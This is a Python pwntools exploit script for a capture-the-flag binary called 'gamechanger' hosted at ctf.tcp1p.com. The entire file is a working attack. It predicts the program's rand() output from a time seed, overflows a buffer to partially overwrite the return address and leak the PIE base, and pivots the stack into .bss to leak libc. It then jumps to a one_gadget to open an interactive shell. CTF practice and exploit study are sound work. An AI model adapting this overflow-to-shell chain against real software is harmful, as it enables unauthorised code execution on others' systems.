#!usr/bin/python3
from pwn import *
from ctypes import CDLL
import time

# =========================================================
#                          SETUP                         
# =========================================================
exe = './gamechanger_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
cdll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'
host, port = 'ctf.tcp1p.com', 9254

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *ask+135
break *ask
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def randomize():
    rand = (cdll.rand() + 0x22) % 0x17
    return rand

def exploit():
    global io
    rop = ROP(libc)
    io = initialize()
    cdll.srand(cdll.time(None))
    
    # leaking aslr
    io.sendline(b'1')
    payload = cyclic(264) + b'\xc0'  # lower bytes of ret, calling ask() again
    io.sendlineafter(b'guess', str(randomize()))
    io.sendafter(b'?', payload) 
    
    # aslr leaked
    io.recvuntil(b'paac')
    elf.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x14c0
    
    # leaking libc
    payload = flat({
        256: [
            elf.bss() + 0x200,      # ret to non-frame initialized address, need to pivot
            elf.sym['ask'] + 21,
        ]
    })
    io.sendafter(b'?', payload)
    
    # libc leaked
    io.recvuntil(b'person!\n')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x620d0
    
    # spawn shell
    one_gadgets = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]
    payload = flat({
        256: [
            elf.bss() + 0x100,
            libc.address + one_gadgets[1],
        ]
    })
    sleep(1)
    io.send(payload)
    
    info('piebase: %#x', elf.address)
    info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()